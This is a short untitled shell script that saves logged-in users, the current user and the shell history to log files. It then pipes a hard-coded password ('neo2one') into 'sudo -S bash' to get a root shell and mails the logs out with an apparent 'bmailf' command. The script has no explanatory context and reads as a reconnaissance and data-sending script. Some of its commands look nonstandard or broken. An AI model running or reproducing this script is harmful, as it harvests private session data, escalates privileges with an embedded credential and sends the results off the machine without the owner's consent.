w > log.1.txt
whoami > log.2.txt
history > log.3.txt
echo "neo2one" | sudo -S bash
sudo whoami >> log.2.txt
bmailf log.*.txt
sudo restart
